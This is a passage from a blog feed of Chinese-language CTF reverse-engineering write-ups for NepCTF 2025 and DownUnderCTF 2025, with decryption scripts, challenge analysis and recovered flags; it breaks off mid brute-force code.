function_">is_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> n % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_prime</span>(<span class="params">index, byte_val</span>):</span><br><span class="line">    n = (index * <span class="number">384</span>) + byte_val</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(n) <span class="keyword">and</span> (n - <span class="number">1</span>) % <span class="number">5</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dec1</span>():</span><br><span class="line">    primes = [<span class="number">359</span>, <span class="number">383</span>]</span><br><span class="line">    plaintext_bytes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Enc)):</span><br><span class="line">        p = primes[i]</span><br><span class="line">        q = primes[i+<span class="number">1</span>]</span><br><span class="line">        c = Enc[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ†åˆ«æ±‚è§£ x^5 â‰¡ c (mod p) å’Œ x^5 â‰¡ c (mod q)</span></span><br><span class="line">        d_p = <span class="built_in">pow</span>(<span class="number">5</span>, -<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        d_q = <span class="built_in">pow</span>(<span class="number">5</span>, -<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">        x_p = <span class="built_in">pow</span>(c, d_p, p)</span><br><span class="line">        x_q = <span class="built_in">pow</span>(c, d_q, q)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸­å›½å‰©ä½™å®šç†åˆå¹¶è§£</span></span><br><span class="line">        inv_p_mod_q = <span class="built_in">pow</span>(p, -<span class="number">1</span>, q)</span><br><span class="line">        h = ((x_q - x_p) * inv_p_mod_q) % q</span><br><span class="line">        x = x_p + p * h</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¡ç®—å‡ºæ˜æ–‡å­—èŠ‚</span></span><br><span class="line">        byte_val = x - <span class="number">64</span></span><br><span class="line">        plaintext_bytes.append(byte_val)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¡ç®—ä¸‹ä¸€ä¸ªç´ æ•°</span></span><br><span class="line">        next_prime = find_next_prime(i + <span class="number">1</span>, byte_val)</span><br><span class="line">        primes.append(next_prime)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ksa</span>(<span class="params">key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    key_bytes = key.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    key_len = <span class="built_in">len</span>(key_bytes)</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key_bytes[i % key_len]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dec2</span>(<span class="params">ciphertext: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key = <span class="string">&quot;Speedmino Created By MrZ and modified by zxc&quot;</span></span><br><span class="line">    </span><br><span class="line">    secret_box = ksa(key)</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plaintext = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> byte_data <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + secret_box[i]) % <span class="number">256</span></span><br><span class="line">        secret_box[i], secret_box[j] = secret_box[j], secret_box[i]</span><br><span class="line">        keystream_byte = secret_box[(secret_box[i] + secret_box[j]) % <span class="number">256</span>]</span><br><span class="line">        decrypted_byte = (byte_data - keystream_byte + <span class="number">256</span>) % <span class="number">256</span></span><br><span class="line">        plaintext.append(decrypted_byte)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypted_data = Dec1()</span><br><span class="line"></span><br><span class="line">    decrypted_bytes = Dec2(encrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># NepCTF&#123;Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NepCTF2025-WP&quot;&gt;&lt;a href=&quot;#NepCTF2025-WP&quot; class=&quot;headerlink&quot; title=&quot;NepCTF2025 WP&quot;&gt;&lt;/a&gt;NepCTF2025 WP&lt;/h1&gt;&lt;p&gt;è¿™æ¬¡é€†å‘çš„é¢˜ç›®è´¨é‡éƒ½æŒºå¥½çš„ï¼Œå„ä¸ªè€ƒç‚¹éƒ½ä¸é”™ï¼Œæ‹¿ä¸‹ä¸‰ä¸ª</summary>
      
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>DownUnderCTF2025 WP</title>
    <link href="https://tkazer.github.io/2025/07/21/DownUnderCTF2025/"/>
    <id>https://tkazer.github.io/2025/07/21/DownUnderCTF2025/</id>
    <published>2025-07-21T07:20:15.000Z</published>
    <updated>2025-07-21T12:11:41.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DownUnderCTF-Reverse-WP"><a href="#DownUnderCTF-Reverse-WP" class="headerlink" title="DownUnderCTF Reverse WP"></a>DownUnderCTF Reverse WP</h1><p>è¿™æ¬¡æ¯”èµ›æ²¡æœ‰å®‰å“ï¼Œæ‰“çš„å¾ˆå¼€å¿ƒï¼ˆï¼Œç»™æœ€åä¸€é¢˜hardéš¾åº¦çš„swifté€†å‘æŠ˜ç£¨åˆ°å‡Œæ™¨ä¸‰ç‚¹å¤šæ‰AKï¼Œæ€»ä½“éš¾åº¦è¿˜è¡Œï¼Œpythoné‚£é¢˜æ¯”è¾ƒæœ‰æ–°æ„ï¼ŒSwiftçº¯æ˜¯è¯­è¨€æœ¬èº«æ‹”é«˜çš„éš¾åº¦ã€‚</p><h2 id="rocky"><a href="#rocky" class="headerlink" title="rocky"></a>rocky</h2><p>mainå‡½æ•°å°†è¾“å…¥æ–‡æœ¬è¿›è¡Œmd5ï¼Œç„¶åä¸s1æ¯”å¯¹ï¼Œè‹¥æ¯”å¯¹æˆåŠŸåˆ™è§£å¯†æ–‡æœ¬è¾“å‡ºã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image.png" alt="alt text"></p><p>ç›´æ¥ç½‘ç«™ç¢°æ’md5ï¼Œå¾—åˆ°â€emergencycall911â€</p><p><img src="/2025/07/21/DownUnderCTF2025/image-1.png" alt="alt text"></p><p>è¿è¡Œè¾“å…¥å³å¯å¾—åˆ°Flagã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-2.png" alt="alt text"></p><p><strong>DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}</strong></p><h2 id="skippy"><a href="#skippy" class="headerlink" title="skippy"></a>skippy</h2><p>stoneå‡½æ•°å’Œdecryptorå‡½æ•°å­˜åœ¨æ— æ•ˆæŒ‡é’ˆè¯»å–æ“ä½œã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-3.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-5.png" alt="alt text"></p><p>nopå¯¹åº”çš„ä¸¤å¤„æ±‡ç¼–å³å¯ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-4.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-6.png" alt="alt text"></p><p>è¿è¡Œï¼Œè‡ªè§£å¯†å¾—åˆ°Flagã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-7.png" alt="alt text"></p><p><strong>DUCTF{There_echoes_a_chorus_enending_and_wild_Laughter_and_gossip_unruly_and_piled}</strong></p><h2 id="godot"><a href="#godot" class="headerlink" title="godot"></a>godot</h2><p>ç›´æ¥æ‹–å…¥Godot RE Toolsï¼ˆGDREï¼‰åˆ†æï¼Œå‘ç°æ— æ³•è§£åŒ…ï¼Œåº”è¯¥æ˜¯pckè¢«åŠ å¯†äº†ã€‚</p><p>IDAæ‹–å…¥ç¨‹åºåˆ†æï¼Œæœç´¢encryptï¼Œå‘ç°ä»¥ä¸‹æ–‡æœ¬ï¼Œåº”è¯¥æ˜¯æ‰“å¼€åŠ å¯†æ•°æ®çš„ä¸€ä¸ªLogæ–‡æœ¬ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-8.png" alt="alt text"></p><p>åœ¨ä»–çš„äº¤å‰è°ƒç”¨å‡½æ•°ä¸‹é¢å°±å¯ä»¥æ‰¾åˆ°GodotåŠ å¯†æ•°æ®è§£å¯†ä»£ç ï¼Œbyte_143F78540å°±æ˜¯AES keyï¼Œå¡«å…¥GDREè®¾ç½®ï¼Œå†æ‹–å…¥ç¨‹åºå³å¯è§£åŒ…ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-9.png" alt="alt text"></p><p>æˆåŠŸè§£åŒ…ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-10.png" alt="alt text"></p><p>å‘ç°ç´ æä¸­æœ‰ä¸ªæ²¡æœ‰åœ¨æ¸¸æˆä¸­å‡ºç°è¿‡çš„è§’è‰²ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-11.png" alt="alt text"></p><p>ä¸”å¯ä»¥çœ‹åˆ°æ˜¯åœ¨godot_spriteå¼•å…¥äº†è¿™å¼ ç´ æã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-12.png" alt="alt text"></p><p>åœ¨src&#x2F;shop.gdä»£ç ä¸­å¯ä»¥çœ‹åˆ°è¿™è¾¹å¼•å…¥äº†godotSpriteï¼Œä¸”åœ¨å¸§å‡½æ•°å®æ—¶åˆ¤æ–­å½“å‰æ—¶é—´æ˜¯å¦ç­‰äºç¨‹åºåˆå§‹åŒ–æ—¶é—´-1å¤©ï¼Œç„¶åæ˜¾ç¤ºgodotSpriteè§’è‰²ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-13.png" alt="alt text"></p><p>è¿è¡Œæ¸¸æˆï¼Œå°†ç”µè„‘è®¾ç½®æ—¥æœŸå¾€å‰ä¸€å¤©ï¼Œåˆ†é’Ÿä¹Ÿå¾€å‰ä¸€åˆ†é’Ÿï¼Œç­‰ä¸€ä¼šåˆ°æ—¶é—´ï¼Œè¿™è¾¹å°±ä¼šåˆ·æ–°å‡ºè¿™ä¸ªè§’è‰²ï¼Œä½†ä¼¼ä¹æ— æ³•äº¤äº’ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-14.png" alt="alt text"></p><p>åœ°å›¾æœ‰å‘ä¸Šçš„é—¯å…³ï¼ŒçŒœæµ‹åœ¨ä¸Šé¢æœ‰å…¶ä»–ä¸œè¥¿ï¼Œè¿™è¾¹ç›´æ¥ç”¨CEå°†Yåæ ‡æ”¹åˆ°-1000ï¼Œé£åˆ°ä¸Šé¢å‘ç°ä¸Šé¢æœ‰å¦ä¸€ä¸ªå•†åº—å’Œè§’è‰²ï¼Œå¯äº¤äº’ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-16.png" alt="alt text"></p><p>å’Œè¿™ä¸ªè§’è‰²å¯¹è¯å®Œï¼Œå†å›åˆ°ä¸‹é¢çš„å•†åº—ï¼Œåœ¨çº¢è‰²è§’è‰²é™„è¿‘ç‚¹ä¸‹Eå°±ä¼šè¢«ä¼ é€åˆ°èƒŒæ™¯å¢™ç”±Flagæ„æˆçš„åœ°å›¾ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-15.png" alt="alt text"></p><p><strong>DUCTF{THE_BOY_WILL_NEVER_REMEMBER}</strong></p><h2 id="bilingual"><a href="#bilingual" class="headerlink" title="bilingual"></a>bilingual</h2><p>pythonä»£ç ä»DATAåŠ è½½äº†ä¸€æ®µBase64åçš„æ–‡ä»¶ï¼Œè§£å¯†è¾“å‡ºåˆ°â€hello.binâ€ï¼Œç„¶åè¦æ±‚è¾“å…¥passwordï¼Œåˆæ­¥åˆ¤æ–­é•¿åº¦æ˜¯å¦ä¸º12ï¼Œé€šè¿‡è°ƒç”¨hello.binçš„å››ä¸ªCheckå‡½æ•°æ ¡éªŒpasswordï¼Œæ ¡éªŒæˆåŠŸåˆ™ä½¿ç”¨passwordè¿›è¡ŒFlagè§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">DATA=<span class="string">&quot;...&quot;</span></span><br><span class="line"><span class="keyword">import</span> argparse,base64,ctypes,zlib,pathlib,sys</span><br><span class="line">PASSWORD=<span class="string">&#x27;cheese&#x27;</span></span><br><span class="line">FLAG=<span class="string">&#x27;jqsD0um75+TyJR3z0GbHwBQ+PLIdSJ+rojVscEL4IYkCOZ6+a5H1duhcq+Ub9Oa+ZWKuL703&#x27;</span></span><br><span class="line">KEY=<span class="string">&#x27;68592cb91784620be98eca41f825260c&#x27;</span></span><br><span class="line">HELPER=<span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">password</span>):A=<span class="string">&#x27;utf-8&#x27;</span>;flag=<span class="built_in">bytearray</span>(base64.b64decode(FLAG));buffer=(ctypes.c_byte*<span class="built_in">len</span>(flag)).from_buffer(flag);key=ctypes.create_string_buffer(password.encode(A));result=get_helper().Decrypt(key,<span class="built_in">len</span>(key)-<span class="number">1</span>,buffer,<span class="built_in">len</span>(buffer));<span class="keyword">return</span> flag.decode(A)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_helper</span>():</span><br><span class="line"><span class="keyword">global</span> HELPER</span><br><span class="line"><span class="keyword">if</span> HELPER:<span class="keyword">return</span> HELPER</span><br><span class="line">data=<span class="built_in">globals</span>().get(<span class="string">&#x27;DATA&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> data:</span><br><span class="line">dll_path=pathlib.Path(__file__).parent/<span class="string">&#x27;hello.bin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> dll_path.is_file():</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(dll_path,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> dll_file:dll_file.write(zlib.decompress(base64.b64decode(data)))</span><br><span class="line">HELPER=ctypes.cdll.LoadLibrary(dll_path)</span><br><span class="line"><span class="keyword">else</span>:<span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> HELPER</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_three</span>(<span class="params">password</span>):<span class="keyword">return</span> check_ex(password,<span class="string">&#x27;Check3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_four</span>(<span class="params">password</span>):<span class="keyword">return</span> check_ex(password,<span class="string">&#x27;Check4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ex</span>(<span class="params">password,func</span>):</span><br><span class="line">GetIntCallbackFn=ctypes.CFUNCTYPE(ctypes.c_int,ctypes.c_wchar_p)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CallbackTable</span>(ctypes.Structure):_fields_=[(<span class="string">&#x27;E&#x27;</span>,GetIntCallbackFn)]</span><br><span class="line"><span class="meta">@GetIntCallbackFn</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_int</span>(<span class="params">v</span>):<span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">eval</span>(v))</span><br><span class="line">table=CallbackTable(E=eval_int);helper=get_helper();helper[func].argtypes=[ctypes.POINTER(CallbackTable)];helper[func].restype=ctypes.c_int;<span class="keyword">return</span> helper[func](ctypes.byref(table))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_two</span>(<span class="params">password</span>):</span><br><span class="line"><span class="meta">@ctypes.CFUNCTYPE(<span class="params">ctypes.c_int,ctypes.c_int</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">i</span>):<span class="keyword">return</span> <span class="built_in">ord</span>(password[i-<span class="number">3</span>])+<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_helper().Check2(callback)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_one</span>(<span class="params">password</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(password)!=<span class="number">12</span>:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> get_helper().Check1(password)!=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">password</span>):</span><br><span class="line"><span class="keyword">global</span> PASSWORD;PASSWORD=password;checks=[check_one,check_two,check_three,check_four];result=<span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> check <span class="keyword">in</span> checks:result=result <span class="keyword">and</span> check(password)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">parser=argparse.ArgumentParser(description=<span class="string">&#x27;CTF Challenge&#x27;</span>);parser.add_argument(<span class="string">&#x27;password&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;Enter the password&#x27;</span>);args=parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> check_password(args.password):flag=decrypt_flag(args.password);<span class="built_in">print</span>(<span class="string">&#x27;Correct! The flag is DUCTF&#123;%s&#125;&#x27;</span>%flag);<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&#x27;That is not correct&#x27;</span>);<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:sys.exit(main())</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ”¹ä»£ç åœ¨mainæœ€å¼€å§‹è°ƒç”¨get_helperï¼Œå¾—åˆ°hello.binæ–‡ä»¶ï¼Œè¿›è¡ŒIDAåˆ†æï¼ŒåŠ¨è°ƒè®¾ç½®è¿™æ ·å°±å¯ä»¥è°ƒè¯•pythonçš„ä»£ç è°ƒç”¨ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-18.png" alt="alt text"></p><p>Check1å¾ˆç®€å•ï¼Œå°±æ˜¯å–ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œåˆ¤æ–­xor 0x43æ˜¯å¦ç­‰äº11ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯11^0x43&#x3D;0x48ï¼Œâ€™Hâ€™ã€‚</p><p>ç›®å‰è¾“å…¥ï¼š</p><blockquote><p>H234567890ab</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-20.png" alt="alt text"></p><p>Check2è¿™è¾¹ä¸€ä¸ªcallbackæ˜¯è¿”å›password[i-3]+3ï¼Œidaé‚£è¾¹çš„Check2å®ç°ä¹Ÿèƒ½çœ‹åˆ°è°ƒç”¨äº†a1ä¼ è¿›çš„å‡½æ•°å›è°ƒï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™è¾¹æ˜¯åˆ¤æ–­å¼å­è®¡ç®—å‡ºä¸¤ä¸ªå­—èŠ‚ï¼Œp[5]&#x3D;â€™pâ€™ï¼Œp[6]&#x3D;â€™hâ€™ã€‚</p><p>ç›®å‰è¾“å…¥ï¼š</p><blockquote><p>H2345ph890ab</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-21.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-22.png" alt="alt text"></p><p>Check3ï¼Œè¿™è¾¹å…ˆä»Pythoné‚£è¾¹è·å–åˆ°è¾“å…¥çš„passwordï¼Œä»¥wordå‚¨å­˜ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-23.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-24.png" alt="alt text"></p><p>ä¸‹é¢è¿™è¾¹ç”Ÿæˆå‡ ä¸ªæ¡ä»¶è¯­å¥ï¼Œè¦ç‰¹åˆ«æ³¨æ„ç¬¬äºŒä¸ªandåé¢é‚£ä¸ªå‡æ•°æ˜¯%cä¸æ˜¯%dï¼Œæ‰€ä»¥98 - 5çš„5æ˜¯â€™5â€™ï¼Œä¹Ÿå°±æ˜¯p[4]å­—èŠ‚ã€‚</p><p>ä»æ•°æ®å¯ä»¥æ€»ç»“ä»¥ä¸‹æ¡ä»¶ï¼š</p><blockquote><p>p[8] + 2 &#x3D;&#x3D; p[11] &amp; p[7] &#x3D;&#x3D; p[8] &amp; (p[11] - (p[4] - â€˜0â€™)) &#x3D;&#x3D; p[11]</p></blockquote><blockquote><p>p[7]&gt;â€™0â€™ &amp; p[7]&lt;â€™9â€™</p></blockquote><p>æ‰€ä»¥p[4]&#x3D;â€™0â€™ï¼Œp[7]&#x3D;&#x3D;p[8]&#x3D;&#x3D;p[11]-2ï¼Œp[7] p[8]éƒ½åœ¨â€™0â€™åˆ°â€™9â€™èŒƒå›´å†…ã€‚</p><p>ç›®å‰è¾“å…¥ï¼ˆp[7] p[8] p[11]éšä¾¿å–ä¸€ç»„ç¬¦åˆæ¡ä»¶çš„å…ˆï¼‰ï¼š</p><blockquote><p>H2340ph110a3</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-25.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-26.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-27.png" alt="alt text"></p><p>Check4æ¯”è¾ƒå¤æ‚ï¼Œè¿™ä¸ªå‡½æ•°å‚æ•°1ä¼ å…¥å¯†æ–‡ï¼Œå‚æ•°2æ˜¯å¯†æ–‡é•¿åº¦ï¼Œå‚æ•°3æ˜¯è§£å¯†è¿”å›æ•°æ®ï¼Œå‚æ•°4æ˜¯å¯†é’¥ï¼Œå‚æ•°5æ˜¯å¯†é’¥é•¿åº¦ï¼Œå‚æ•°6æ˜¯åˆ¤æ–­æ•°å€¼ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-28.png" alt="alt text"></p><p>ä¼ å…¥å…ˆä½¿ç”¨ä¼ å…¥å¯†é’¥è¿›è¡Œrc4è§£å¯†å¯†æ–‡ï¼Œç„¶åè¿›è¡Œhashï¼Œæœ€ååˆ¤æ–­æ˜¯å¦ç­‰äºå‚æ•°6çš„hashå€¼ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-29.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-30.png" alt="alt text"></p><p>ç”±äºç¬¬ä¸€ä¸ªhashåˆ¤æ–­åªç”¨å¯†é’¥å‰2å­—èŠ‚ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚ä¹Ÿæ˜¯Check1å’ŒCheck2é€šè¿‡è¾“å…¥å­—èŠ‚è®¡ç®—å‡ºæ¥çš„ï¼Œåªè¦è¿‡äº†è¿™ä¸¤ä¸ªCheckï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå­—èŠ‚å°±ä¼šæ˜¯æ­£ç¡®çš„ï¼Œä¹Ÿå°±èƒ½é€šè¿‡è¿™ä¸ªhashæ ¡éªŒã€‚</p><p>ç¬¬ä¸€ä¸ªè§£å¯†å‡ºçš„æ–‡æœ¬ï¼š</p><p><img src="/2025/07/21/DownUnderCTF2025/image-31.png" alt="alt text"></p><p>ç¬¬äºŒä¸ªæ ¡éªŒå¯†é’¥é•¿åº¦æ˜¯8ï¼Œä¸‹æ ‡3ã€4ã€5ã€6éƒ½åˆ†åˆ«èµ‹å€¼äº†ï¼Œä¸‹æ ‡2å’Œ7ä¸ºé»˜è®¤çš„0xCCï¼Œè¿™è¾¹èµ‹å€¼æ˜¯é€šè¿‡p[1] p[2] p[3]ä¸‰ä¸ªæœªçŸ¥å­—èŠ‚è¿›è¡Œè®¡ç®—ï¼Œç”±äºæ˜¯æœªçŸ¥çš„ï¼Œå°±åªèƒ½çˆ†ç ´ï¼Œä¸‰å­—èŠ‚çˆ†ç ´æœ€åhashå€¼ä¸º0x69FA99Dã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-32.png" alt="alt text"></p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 